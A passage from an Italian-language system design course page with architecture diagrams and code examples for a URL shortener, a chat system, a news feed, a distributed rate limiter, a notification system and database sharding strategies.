            num = num * 62 + ALPHABET.indexOf(c);
        }
        return num;
    }
}

// Con database auto-increment ID:
// ID 1000000 → encode → "4c92"</code></pre>

                <h3>High-Level Design</h3>
                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                         URL Shortener Architecture                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌─────────┐      ┌──────────────┐      ┌───────────────────────────────┐  │
│   │ Browser │─────►│ Load Balancer │─────►│        Web Servers            │  │
│   └─────────┘      └──────────────┘      └───────────────┬───────────────┘  │
│                                                          │                  │
│                                          ┌───────────────┴───────────────┐  │
│                                          │                               │  │
│                                    WRITE │                         READ  │  │
│                                          ▼                               ▼  │
│                                   ┌─────────────┐              ┌─────────┐  │
│                                   │  Primary DB │              │  Cache  │  │
│                                   │  (Write)    │──replicate──►│ (Redis) │  │
│                                   └──────┬──────┘              └────┬────┘  │
│                                          │                          │       │
│                                          │       ┌──────────────────┘       │
│                                          ▼       ▼ (cache miss)             │
│                                   ┌─────────────────┐                       │
│                                   │  Read Replicas  │                       │
│                                   └─────────────────┘                       │
│                                                                             │
│   Read Flow (99% del traffico):                                            │
│   1. Client GET /abc123                                                    │
│   2. Check Redis cache (hit → return 301)                                   │
│   3. Cache miss → query Read Replica                                        │
│   4. Populate cache, return 301                                             │
│                                                                             │
│   Write Flow:                                                               │
│   1. Client POST /shorten with long_url                                     │
│   2. Generate short_code (hash or KGS)                                      │
│   3. Write to Primary DB                                                    │
│   4. Return short_url                                                       │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Deep Dive: Caching Strategy</h3>
                <pre><code class="language-java">// Cache-Aside Pattern (più comune per read-heavy)
public String getLongUrl(String shortCode) {
    // 1. Try cache first
    String longUrl = redis.get("url:" + shortCode);

    if (longUrl != null) {
        return longUrl;  // Cache HIT
    }

    // 2. Cache MISS - query database
    longUrl = urlRepository.findByShortCode(shortCode);

    if (longUrl != null) {
        // 3. Populate cache for next time
        redis.setex("url:" + shortCode, 24 * 3600, longUrl);  // TTL 24h
    }

    return longUrl;
}

// Con 10B redirects/day e 95% cache hit rate:
// - 9.5B served da Redis (< 1ms latency)
// - 500M vanno al DB (accettabile con read replicas)</code></pre>

                <h3>Deep Dive: Database Sharding</h3>
                <pre><code class="language-java">// Sharding by short_code hash
// Pro: Distribuzione uniforme
// Con: Range queries difficili

int shardId = hash(shortCode) % NUM_SHARDS;

// Sharding by creation time (range-based)
// Pro: Hot data recente su pochi shards
// Con: Unbalanced se traffico recente >> vecchio

int shardId = getYearMonth(createdAt);  // es: 202501

// Consistent Hashing (preferibile per scaling dinamico)
// Vedi sezione Pattern per dettagli</code></pre>
            </section>

            <!-- Chat System Section -->
            <section class="section" id="modulo13-chat">
                <h2>Esercizio: Chat System (WhatsApp/Messenger)</h2>

                <p>Progetta un sistema di chat real-time. Le sfide principali: consegna messaggi garantita, presenza online, e milioni di connessioni concorrenti.</p>

                <h3>Requirements</h3>
                <div class="info-box">
                    <h4>Funzionali</h4>
                    <ul>
                        <li>1-on-1 chat</li>
                        <li>Group chat (fino a 500 membri)</li>
                        <li>Message status (sent, delivered, read)</li>
                        <li>Online/offline presence</li>
                        <li>Push notifications per utenti offline</li>
                        <li>Message history e sync multi-device</li>
                    </ul>
                    <h4>Non-Funzionali</h4>
                    <ul>
                        <li>Real-time delivery (< 100ms quando online)</li>
                        <li>At-least-once delivery (no message loss)</li>
                        <li>Scale: 500M DAU, 50B messages/day</li>
                        <li>Multi-device support</li>
                    </ul>
                </div>

                <h3>High-Level Architecture</h3>
                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                           Chat System Architecture                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌─────────┐         ┌──────────────────┐        ┌─────────────────────┐    │
│  │ Client A│◄──WS───►│ Chat Server 1    │◄──────►│    Redis Pub/Sub   │    │
│  │         │         │ (maintains conn) │        │    (fan-out)       │    │
│  └─────────┘         └────────┬─────────┘        └──────────┬──────────┘    │
│                               │                             │               │
│  ┌─────────┐         ┌────────┴─────────┐        ┌──────────┴──────────┐    │
│  │ Client B│◄──WS───►│ Chat Server 2    │◄──────►│    Message Queue   │    │
│  │         │         │ (maintains conn) │        │    (Kafka)         │    │
│  └─────────┘         └────────┬─────────┘        └──────────┬──────────┘    │
│                               │                             │               │
│                               ▼                             ▼               │
│                      ┌─────────────────┐         ┌─────────────────────┐    │
│                      │  Message Store  │         │  Push Notification  │    │
│                      │  (Cassandra)    │         │  Service            │    │
│                      └─────────────────┘         └─────────────────────┘    │
│                                                                             │
│  Key Components:                                                            │
│  • WebSocket servers: mantengono connessioni persistenti                   │
│  • Redis Pub/Sub: routing messaggi tra chat servers                        │
│  • Kafka: persistenza messaggi, delivery garantita                         │
│  • Cassandra: storage messaggi (write-heavy, time-series)                  │
│  • Push Service: notifica utenti offline (APNs, FCM)                       │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>WebSocket vs Polling</h3>
                <pre><code class="language-java">// HTTP Polling: client chiede periodicamente
// Pro: Semplice
// Con: Spreco bandwidth, latenza = poll interval

// Long Polling: server tiene la connessione aperta fino a nuovo messaggio
// Pro: Riduce richieste vuote
// Con: Server tiene connessioni aperte, timeout handling

// WebSocket: connessione bidirezionale persistente
// Pro: Real-time, basso overhead dopo handshake
// Con: Stateful (server deve gestire connessione)

// Per chat real-time → WebSocket è la scelta giusta

@ServerEndpoint("/chat/{userId}")
public class ChatEndpoint {
    private static Map&lt;String, Session&gt; sessions = new ConcurrentHashMap&lt;&gt;();

    @OnOpen
    public void onOpen(Session session, @PathParam("userId") String userId) {
        sessions.put(userId, session);
        // Registra su Redis quale server gestisce questo utente
        redis.hset("user:location", userId, serverId);
    }

    @OnMessage
    public void onMessage(String message, Session session) {
        ChatMessage msg = parse(message);
        // Pubblica su Kafka per persistenza
        kafka.send("messages", msg);
        // Delivery al destinatario
        deliverMessage(msg);
    }

    @OnClose
    public void onClose(Session session, @PathParam("userId") String userId) {
        sessions.remove(userId);
        redis.hdel("user:location", userId);
    }
}</code></pre>

                <h3>Message Delivery Flow</h3>
                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        Message Delivery Flow                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  User A sends "Hello" to User B                                            │
│                                                                             │
│  1. SEND                                                                    │
│     A ─────► Chat Server 1 ─────► Kafka (persist) ─────► ACK to A          │
│              │                                                              │
│              └──► Mark message as "SENT" ✓                                  │
│                                                                             │
│  2. ROUTE (User B is online on Chat Server 2)                              │
│     Chat Server 1 ─────► Redis Pub/Sub ─────► Chat Server 2                │
│                          (channel: user_B)                                  │
│                                                                             │
│  3. DELIVER                                                                 │
│     Chat Server 2 ─────► User B (via WebSocket)                            │
│     │                                                                       │
│     └──► Mark message as "DELIVERED" ✓✓                                    │
│                                                                             │
│  4. READ (User B opens chat)                                               │
│     User B ─────► Chat Server 2 ─────► Update status ─────► Notify A       │
│     │                                                                       │
│     └──► Mark message as "READ" ✓✓ (blue ticks)                            │
│                                                                             │
│  5. OFFLINE CASE (User B is offline)                                       │
│     Chat Server 1 ─────► Redis lookup (B not online)                       │
│     │                                                                       │
│     └──► Push Notification Service ─────► APNs/FCM ─────► B's phone        │
│     │                                                                       │
│     └──► Store in "pending" queue, deliver when B reconnects               │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Data Model</h3>
                <pre><code class="language-java">// Message storage con Cassandra (ottimizzato per time-series writes)
CREATE TABLE messages (
    conversation_id UUID,
    message_id      TIMEUUID,        -- ordinamento temporale built-in
    sender_id       UUID,
    content         TEXT,
    message_type    TEXT,            -- text, image, video
    status          TEXT,            -- sent, delivered, read
    created_at      TIMESTAMP,
    PRIMARY KEY ((conversation_id), message_id)
) WITH CLUSTERING ORDER BY (message_id DESC);

// Query: tutti i messaggi di una conversazione (paginati)
SELECT * FROM messages
WHERE conversation_id = ?
ORDER BY message_id DESC
LIMIT 50;

// Perché Cassandra?
// - Write-heavy (50B messages/day)
// - Partition per conversation_id → locality
// - Time-series ordering con TIMEUUID
// - Linear scalability

// User presence in Redis
HSET user:presence user123 '{"status":"online","last_seen":1640000000}'
EXPIRE user:presence 300  // TTL 5 minuti, heartbeat rinnova</code></pre>

                <h3>Group Chat Fan-out</h3>
                <pre><code class="language-java">// Gruppo con 500 membri - come distribuire il messaggio?

// Opzione 1: Fan-out on Write
// Quando A invia messaggio al gruppo, crea 500 copie (una per membro)
// Pro: Read è velocissimo (query per user_id)
// Con: 500x storage, 500x write amplification

// Opzione 2: Fan-out on Read (preferibile per gruppi grandi)
// Messaggio salvato una volta, ogni membro legge dalla stessa source
// Pro: Storage efficiente
// Con: Read più complessa (join group_members)

// Soluzione ibrida per delivery real-time:
public void sendToGroup(String groupId, Message msg) {
    // 1. Persist once
    messageStore.save(msg);

    // 2. Get online members only
    Set&lt;String&gt; onlineMembers = redis.smembers("group:" + groupId + ":online");

    // 3. Fan-out solo agli online (subset piccolo)
    for (String memberId : onlineMembers) {
        String serverLocation = redis.hget("user:location", memberId);
        redisPubSub.publish(serverLocation, msg);
    }

    // 4. Offline members riceveranno alla reconnection (pull-based)
}</code></pre>
            </section>

            <!-- News Feed Section -->
            <section class="section" id="modulo13-newsfeed">
                <h2>Esercizio: News Feed / Timeline (Facebook/Twitter)</h2>

                <p>Progetta il feed di Facebook o la timeline di Twitter. La sfida principale: aggregare contenuti da migliaia di amici/following in tempo reale con ranking personalizzato.</p>

                <h3>Requirements</h3>
                <div class="info-box">
                    <h4>Funzionali</h4>
                    <ul>
                        <li>Pubblicare post (testo, immagini, video)</li>
                        <li>Vedere feed con post degli amici/following</li>
                        <li>Feed personalizzato con ranking algorithm</li>
                        <li>Supporto per likes, comments, shares</li>
                    </ul>
                    <h4>Non-Funzionali</h4>
                    <ul>
                        <li>Feed generation < 500ms</li>
                        <li>Fresh content (new posts visible in seconds)</li>
                        <li>Scale: 500M DAU, 1000 friends avg, 5 posts/day avg</li>
                    </ul>
                </div>

                <h3>Core Problem: Fan-out</h3>
                <p>Quando User A pubblica un post, come lo mostri ai suoi 1000 followers?</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                    Fan-out on Write vs Fan-out on Read                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  FAN-OUT ON WRITE (Push Model)                                             │
│  ─────────────────────────────                                              │
│                                                                             │
│  User A posts ──► For each follower ──► Add to their feed cache            │
│                                                                             │
│  ┌──────┐        ┌─────────────┐        ┌─────────────────────────┐        │
│  │Post  │───────►│Fan-out      │───────►│ Feed Cache (Redis)      │        │
│  │Service│        │Worker       │        │ user_B_feed: [post1,...]│        │
│  └──────┘        └─────────────┘        │ user_C_feed: [post1,...]│        │
│                                         │ ...1000 followers        │        │
│                                         └─────────────────────────┘        │
│                                                                             │
│  Pro: Read feed è O(1) - già pre-computato                                 │
│  Con: Write amplification (1 post → 1000 writes)                           │
│       Celebrity problem (10M followers = 10M writes)                        │
│                                                                             │
│  ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│  FAN-OUT ON READ (Pull Model)                                              │
│  ─────────────────────────────                                              │
│                                                                             │
│  User B opens app ──► Fetch posts from all followings ──► Merge & Rank     │
│                                                                             │
│  ┌──────┐        ┌─────────────┐        ┌─────────────────────────┐        │
│  │Feed  │◄───────│Aggregation  │◄───────│ Posts table             │        │
│  │Request│        │Service      │        │ SELECT * FROM posts     │        │
│  └──────┘        └─────────────┘        │ WHERE author IN (...)   │        │
│                                         │ ORDER BY created_at     │        │
│                                         └─────────────────────────┘        │
│                                                                             │
│  Pro: No write amplification                                               │
│  Con: Read is expensive (query 1000 following, merge, rank)                │
│       Slow for users with many followings                                   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Hybrid Approach (Best Practice)</h3>
                <pre><code class="language-java">// Soluzione: Hybrid fan-out
// - Utenti normali (< 10K followers): fan-out on write
// - Celebrity (> 10K followers): fan-out on read

public void publishPost(Post post) {
    // 1. Persist post
    postRepository.save(post);

    User author = userRepository.findById(post.getAuthorId());
    long followerCount = author.getFollowerCount();

    if (followerCount < 10_000) {
        // 2a. Fan-out on write per utenti normali
        fanOutService.pushToFollowerFeeds(post);
    } else {
        // 2b. Celebrity post - sarà fetched on read
        // Solo mark come "celebrity post" per merge
        celebrityPostCache.add(post);
    }
}

public List&lt;Post&gt; getFeed(String userId) {
    // 1. Get pre-computed feed (posts da utenti normali)
    List&lt;Post&gt; feed = feedCache.getRange("feed:" + userId, 0, 100);

    // 2. Merge con celebrity posts (fetch on read)
    List&lt;String&gt; celebrityFollowings = getCelebrityFollowings(userId);
    List&lt;Post&gt; celebrityPosts = postRepository.findRecent(celebrityFollowings);

    // 3. Merge e rank
    return rankingService.merge(feed, celebrityPosts);
}</code></pre>

                <h3>Feed Ranking</h3>
                <pre><code class="language-java">// Ranking score semplificato
// Real systems usano ML models molto più complessi

public double calculateScore(Post post, User viewer) {
    double score = 0;

    // Recency (decay over time)
    long ageHours = hoursSince(post.getCreatedAt());
    score += 1.0 / (1 + ageHours * 0.1);  // decay factor

    // Engagement
    score += post.getLikeCount() * 0.1;
    score += post.getCommentCount() * 0.3;
    score += post.getShareCount() * 0.5;

    // Affinity (quanto il viewer interagisce con l'author)
    double affinity = getAffinityScore(viewer.getId(), post.getAuthorId());
    score *= (1 + affinity);  // boost per amici stretti

    // Content type preference
    if (viewer.prefersVideos() && post.hasVideo()) {
        score *= 1.2;
    }

    return score;
}

// Edge Rank (Facebook's original algorithm)
// Score = Affinity × Weight × Decay
// - Affinity: quanto interagisci con quella persona
// - Weight: tipo di contenuto (video > photo > text)
// - Decay: quanto è vecchio il post</code></pre>

                <h3>Architecture</h3>
                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                         News Feed Architecture                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌──────────────────────────────────────────────────────────────────────┐   │
│  │                          WRITE PATH                                  │   │
│  │                                                                      │   │
│  │  User ──► Post Service ──► Posts DB ──► Fan-out Queue (Kafka)       │   │
│  │                                              │                       │   │
│  │                                              ▼                       │   │
│  │                                        Fan-out Workers               │   │
│  │                                              │                       │   │
│  │                      ┌───────────────────────┴───────────────────┐   │   │
│  │                      ▼                                           ▼   │   │
│  │               Feed Cache (Redis)                         Notification│   │
│  │               user_X_feed: [post_ids...]                 Service    │   │
│  │                                                                      │   │
│  └──────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  ┌──────────────────────────────────────────────────────────────────────┐   │
│  │                          READ PATH                                   │   │
│  │                                                                      │   │
│  │  User ──► Feed Service ──► Feed Cache (get pre-computed)            │   │
│  │                │                    │                               │   │
│  │                │                    ▼                               │   │
│  │                │             Celebrity Posts (merge on read)        │   │
│  │                │                    │                               │   │
│  │                ▼                    ▼                               │   │
│  │           Ranking Service ◄───── Merged Posts                       │   │
│  │                │                                                    │   │
│  │                ▼                                                    │   │
│  │           Post Hydration (fetch full post data, author info, etc)   │   │
│  │                │                                                    │   │
│  │                ▼                                                    │   │
│  │           Response to Client                                        │   │
│  │                                                                      │   │
│  └──────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>
            </section>

            <!-- Rate Limiter Section -->
            <section class="section" id="modulo13-ratelimiter">
                <h2>Esercizio: Rate Limiter</h2>

                <p>Progetta un rate limiter distribuito per proteggere le API da abuse e garantire fair usage. Questa è sia una domanda di system design che un building block fondamentale.</p>

                <h3>Requirements</h3>
                <div class="info-box">
                    <h4>Funzionali</h4>
                    <ul>
                        <li>Limitare richieste per user/IP/API key</li>
                        <li>Configurabile per endpoint (es: 100 req/min per /api/search)</li>
                        <li>Soft limit (warning) vs hard limit (block)</li>
                        <li>Return meaningful error (429 Too Many Requests)</li>
                    </ul>
                    <h4>Non-Funzionali</h4>
                    <ul>
                        <li>Low latency (< 1ms overhead)</li>
                        <li>Distributed (deve funzionare su più server)</li>
                        <li>Accurate (non bloccare richieste legittime)</li>
                        <li>Fault tolerant (se rate limiter down, allow traffic)</li>
                    </ul>
                </div>

                <h3>Algoritmi di Rate Limiting</h3>

                <h4>1. Token Bucket</h4>
                <pre><code class="language-java">// Token Bucket: bucket con token, ogni request consuma un token
// Token vengono aggiunti a rate costante (es: 10 token/sec)
// Se bucket vuoto → reject

public class TokenBucket {
    private final int capacity;        // max tokens
    private final int refillRate;      // tokens per second
    private double tokens;
    private long lastRefillTime;

    public synchronized boolean tryConsume() {
        refill();
        if (tokens >= 1) {
            tokens -= 1;
            return true;  // allowed
        }
        return false;  // rate limited
    }

    private void refill() {
        long now = System.currentTimeMillis();
        double elapsed = (now - lastRefillTime) / 1000.0;
        tokens = Math.min(capacity, tokens + elapsed * refillRate);
        lastRefillTime = now;
    }
}

// Pro: Permette burst (fino a capacity), smooth rate
// Con: Memory per bucket, parametri da tuning (capacity, rate)</code></pre>

                <h4>2. Sliding Window Log</h4>
                <pre><code class="language-java">// Mantieni log di tutti i timestamp delle richieste
// Conta quante richieste nella finestra scorrevole

public class SlidingWindowLog {
    private final int maxRequests;
    private final long windowSizeMs;
    private final Queue&lt;Long&gt; requestLog = new LinkedList&lt;&gt;();

    public synchronized boolean tryConsume() {
        long now = System.currentTimeMillis();
        long windowStart = now - windowSizeMs;

        // Rimuovi richieste fuori dalla finestra
        while (!requestLog.isEmpty() && requestLog.peek() < windowStart) {
            requestLog.poll();
        }

        if (requestLog.size() < maxRequests) {
            requestLog.add(now);
            return true;
        }
        return false;
    }
}

// Pro: Molto accurato, no burst anomali
// Con: Memory O(n) per ogni richiesta nella finestra</code></pre>

                <h4>3. Sliding Window Counter (Best Practice)</h4>
                <pre><code class="language-java">// Compromesso tra Fixed Window e Sliding Window Log
// Usa counter per finestra precedente e corrente, interpola

public class SlidingWindowCounter {
    private final int maxRequests;
    private final long windowSizeMs;

    public boolean tryConsume(String key) {
        long now = System.currentTimeMillis();
        long currentWindow = now / windowSizeMs;
        long previousWindow = currentWindow - 1;

        // Peso della finestra precedente basato su quanto siamo nella corrente
        double positionInWindow = (now % windowSizeMs) / (double) windowSizeMs;
        double previousWeight = 1 - positionInWindow;

        long previousCount = redis.get(key + ":" + previousWindow);
        long currentCount = redis.get(key + ":" + currentWindow);

        // Stima richieste nella sliding window
        double estimatedCount = previousCount * previousWeight + currentCount;

        if (estimatedCount < maxRequests) {
            redis.incr(key + ":" + currentWindow);
            redis.expire(key + ":" + currentWindow, windowSizeMs * 2);
            return true;
        }
        return false;
    }
}

// Pro: Memory efficiente (solo 2 counter), accurato
// Con: Stima, non conta esatto</code></pre>

                <h3>Distributed Rate Limiting con Redis</h3>
                <pre><code class="language-java">// Rate limiter distribuito usando Redis + Lua script (atomico)

public class DistributedRateLimiter {
    private final RedisTemplate&lt;String, String&gt; redis;
    private final int maxRequests;
    private final int windowSeconds;

    // Lua script per atomicità
    private static final String LUA_SCRIPT = """
        local key = KEYS[1]
        local limit = tonumber(ARGV[1])
        local window = tonumber(ARGV[2])

        local current = tonumber(redis.call('GET', key) or '0')

        if current < limit then
            redis.call('INCR', key)
            redis.call('EXPIRE', key, window)
            return 1  -- allowed
        else
            return 0  -- denied
        end
        """;

    public RateLimitResult checkLimit(String userId) {
        String key = "ratelimit:" + userId;

        Long result = redis.execute(
            new DefaultRedisScript<>(LUA_SCRIPT, Long.class),
            List.of(key),
            String.valueOf(maxRequests),
            String.valueOf(windowSeconds)
        );

        long currentCount = redis.opsForValue().get(key);
        long remaining = Math.max(0, maxRequests - currentCount);

        return new RateLimitResult(
            result == 1,           // allowed
            maxRequests,           // limit
            remaining,             // remaining
            getResetTime(key)      // reset timestamp
        );
    }
}

// Response headers
// X-RateLimit-Limit: 100
// X-RateLimit-Remaining: 42
// X-RateLimit-Reset: 1640000060</code></pre>

                <h3>Architecture</h3>
                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                      Distributed Rate Limiter                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌─────────┐      ┌─────────────────────────────────────────────────────┐  │
│   │ Client  │─────►│                  API Gateway                        │  │
│   └─────────┘      │  ┌─────────────────────────────────────────────┐    │  │
│                    │  │           Rate Limiter Middleware            │    │  │
│                    │  │  1. Extract identifier (user_id, IP, key)   │    │  │
│                    │  │  2. Check limit in Redis                    │    │  │
│                    │  │  3. Allow or reject (429)                   │    │  │
│                    │  └───────────────────┬─────────────────────────┘    │  │
│                    └──────────────────────┼──────────────────────────────┘  │
│                                           │                                 │
│                                           ▼                                 │
│                    ┌──────────────────────────────────────────────────────┐ │
│                    │              Redis Cluster                          │ │
│                    │  ┌─────────┐  ┌─────────┐  ┌─────────┐              │ │
│                    │  │ Node 1  │  │ Node 2  │  │ Node 3  │              │ │
│                    │  │user_A:42│  │user_B:10│  │user_C:99│              │ │
│                    │  └─────────┘  └─────────┘  └─────────┘              │ │
│                    │                                                      │ │
│                    │  Key sharding: hash(user_id) % nodes                │ │
│                    │  Replication: master-slave per HA                   │ │
│                    └──────────────────────────────────────────────────────┘ │
│                                                                             │
│   Fallback strategy (if Redis down):                                       │
│   • Local in-memory rate limiter (degraded but functional)                 │
│   • Or fail-open (allow all traffic - depends on risk tolerance)           │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Rate Limiting Strategies</h3>
                <div class="info-box">
                    <h4>Per cosa limitare?</h4>
                    <ul>
                        <li><strong>Per User ID:</strong> Utenti autenticati, più accurato</li>
                        <li><strong>Per IP:</strong> Per guest users, ma NAT può condividere IP</li>
                        <li><strong>Per API Key:</strong> Per B2B APIs, billing-friendly</li>
                        <li><strong>Per Endpoint:</strong> Limiti diversi per /search vs /upload</li>
                        <li><strong>Combinato:</strong> User + Endpoint (100/min per /search, 10/min per /upload)</li>
                    </ul>
                </div>
            </section>

            <!-- Notification System Section -->
            <section class="section" id="modulo13-notification">
                <h2>Esercizio: Notification System</h2>

                <p>Progetta un sistema di notifiche multi-canale (push, email, SMS) scalabile. Le sfide: garantire delivery, gestire preferenze utente, e rate limiting per non spammare.</p>

                <h3>Requirements</h3>
                <div class="info-box">
                    <h4>Funzionali</h4>
                    <ul>
                        <li>Push notifications (iOS, Android, Web)</li>
                        <li>Email notifications</li>
                        <li>SMS notifications</li>
                        <li>In-app notifications</li>
                        <li>User preferences (opt-in/out per tipo e canale)</li>
                        <li>Template management</li>
                    </ul>
                    <h4>Non-Funzionali</h4>
                    <ul>
                        <li>At-least-once delivery</li>
                        <li>Soft real-time (< 5 sec per push)</li>
                        <li>Scale: 10B notifications/day</li>
                        <li>Prioritization (urgent vs marketing)</li>
                    </ul>
                </div>

                <h3>Architecture</h3>
                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                       Notification System Architecture                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌───────────────┐                                                          │
│  │ Services      │                                                          │
│  │ (Order,User,  │──────┐                                                   │
│  │  Payment...)  │      │                                                   │
│  └───────────────┘      │                                                   │
│                         ▼                                                   │
│              ┌─────────────────────┐                                        │
│              │  Notification API   │                                        │
│              │  POST /notify       │                                        │
│              │  {user,type,data}   │                                        │
│              └──────────┬──────────┘                                        │
│                         │                                                   │
│                         ▼                                                   │
│              ┌─────────────────────┐    ┌──────────────────┐                │
│              │   Validation &      │───►│ User Preferences │                │
│              │   Enrichment        │    │ DB               │                │
│              └──────────┬──────────┘    └──────────────────┘                │
│                         │                                                   │
│                         ▼                                                   │
│              ┌─────────────────────┐                                        │
│              │   Priority Queue    │  ← Kafka topics per priority           │
│              │   (Kafka)           │    • HIGH: payment, security           │
│              │                     │    • MEDIUM: social, updates           │
│              │   ┌─────┬─────┐     │    • LOW: marketing, digest           │
│              │   │HIGH │MED  │LOW  │                                        │
│              └───┴──┬──┴──┬──┴─────┘                                        │
│                     │     │                                                 │
│       ┌─────────────┼─────┼─────────────┐                                   │
│       │             │     │             │                                   │
│       ▼             ▼     ▼             ▼                                   │
│  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐                         │
│  │ Push    │  │ Email   │  │  SMS    │  │ In-App  │                         │
│  │ Worker  │  │ Worker  │  │ Worker  │  │ Worker  │                         │
│  └────┬────┘  └────┬────┘  └────┬────┘  └────┬────┘                         │
│       │            │            │            │                              │
│       ▼            ▼            ▼            ▼                              │
│  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐                         │
│  │APNs/FCM │  │SendGrid/│  │Twilio/  │  │WebSocket│                         │
│  │         │  │Mailgun  │  │Nexmo    │  │Server   │                         │
│  └─────────┘  └─────────┘  └─────────┘  └─────────┘                         │
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │                      Analytics & Monitoring                         │    │
│  │  • Delivery rates, open rates, click rates                          │    │
│  │  • Failed deliveries → Retry queue                                  │    │
│  │  • Bounce handling (email), unsubscribe tracking                    │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Data Model</h3>
                <pre><code class="language-java">// User notification settings
CREATE TABLE user_notification_settings (
    user_id       UUID PRIMARY KEY,
    email_enabled BOOLEAN DEFAULT TRUE,
    push_enabled  BOOLEAN DEFAULT TRUE,
    sms_enabled   BOOLEAN DEFAULT FALSE,
    quiet_hours   JSONB,  -- {"start": "22:00", "end": "08:00"}
    preferences   JSONB   -- {"marketing": false, "social": true, ...}
);

// Device tokens per push
CREATE TABLE device_tokens (
    id          UUID PRIMARY KEY,
    user_id     UUID,
    device_type VARCHAR(20),  -- ios, android, web
    token       VARCHAR(500),
    created_at  TIMESTAMP,
    last_used   TIMESTAMP,
    INDEX idx_user_id (user_id)
);

// Notification log (per audit e analytics)
CREATE TABLE notification_log (
    id              UUID PRIMARY KEY,
    user_id         UUID,
    notification_type VARCHAR(50),
    channel         VARCHAR(20),  -- push, email, sms
    status          VARCHAR(20),  -- pending, sent, delivered, failed
    sent_at         TIMESTAMP,
    delivered_at    TIMESTAMP,
    error_message   TEXT,
    metadata        JSONB
) PARTITION BY RANGE (sent_at);  -- partiziona per mese per gestire volume</code></pre>

                <h3>Reliability: Retry with Exponential Backoff</h3>
                <pre><code class="language-java">public class NotificationWorker {
    private static final int MAX_RETRIES = 3;
    private static final int[] BACKOFF_SECONDS = {10, 60, 300};  // 10s, 1m, 5m

    @KafkaListener(topics = "notifications.push")
    public void processPushNotification(NotificationMessage msg) {
        int attempt = msg.getAttempt();

        try {
            pushService.send(msg);
            notificationLog.markDelivered(msg.getId());

        } catch (TemporaryException e) {
            // Provider temporaneamente down - retry
            if (attempt < MAX_RETRIES) {
                int delay = BACKOFF_SECONDS[attempt];
                kafkaTemplate.send(
                    "notifications.push.retry",
                    msg.withAttempt(attempt + 1),
                    delay
                );
            } else {
                notificationLog.markFailed(msg.getId(), e.getMessage());
                alerting.notify("Push delivery failed after " + MAX_RETRIES + " attempts");
            }

        } catch (PermanentException e) {
            // Token invalido, utente non esiste - no retry
            notificationLog.markFailed(msg.getId(), e.getMessage());

            if (e instanceof InvalidTokenException) {
                deviceTokenRepository.delete(msg.getDeviceToken());
            }
        }
    }
}

// Dead Letter Queue per notifiche che falliscono dopo tutti i retry
// Permettono analisi manuale e re-processing se necessario</code></pre>

                <h3>Template Engine</h3>
                <pre><code class="language-java">// Notification template con placeholders
// Stored in DB, versionati, A/B testabili

{
  "id": "order_shipped",
  "channels": {
    "push": {
      "title": "Il tuo ordine è in viaggio! 📦",
      "body": "Ordine #{{order_id}} spedito. Arrivo previsto: {{delivery_date}}"
    },
    "email": {
      "subject": "Ordine #{{order_id}} spedito",
      "template_id": "shipping_confirmation_v2"  // SendGrid template
    },
    "sms": {
      "body": "Ordine #{{order_id}} spedito. Track: {{tracking_url}}"
    }
  },
  "priority": "HIGH",
  "category": "transactional"
}

// Rendering
public String renderTemplate(String templateId, Map&lt;String, Object&gt; data) {
    Template template = templateRepository.findById(templateId);
    return templateEngine.render(template.getBody(), data);
    // "Ordine #12345 spedito. Arrivo previsto: 15 Gen"
}</code></pre>
            </section>

            <!-- Patterns Section -->
            <section class="section" id="modulo13-patterns">
                <h2>Pattern Ricorrenti in System Design</h2>

                <h3>Database Sharding</h3>
                <p>Quando un singolo database non basta, dividi i dati su più server (shards).</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                         Sharding Strategies                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  RANGE-BASED SHARDING                                                       │
│  ─────────────────────                                                      │
│  user_id 1-1M      → Shard 1                                               │
│  user_id 1M-2M     → Shard 2                                               │
│  user_id 2M-3M     → Shard 3                                               │
│                                                                             │
│  Pro: Range queries facili (es: tutti gli utenti creati a gennaio)         │
│  Con: Hotspots se nuovi utenti vanno tutti sull'ultimo shard               │
│                                                                             │
│  ────────────────────────────────────────────────────────────────────────   │
│                                                                             │
│  HASH-BASED SHARDING                                                        │
│  ───────────────────                                                        │
│  shard_id = hash(user_id) % NUM_SHARDS                                     │
│                                                                             │
│  Pro: Distribuzione uniforme                                               │
│  Con: Resharding è costoso (se aggiungi shard, devi rifare tutti gli hash) │
│       Range queries impossibili (dati sparsi su tutti gli shard)           │
│                                                                             │
│  ────────────────────────────────────────────────────────────────────────   │
│                                                                             │
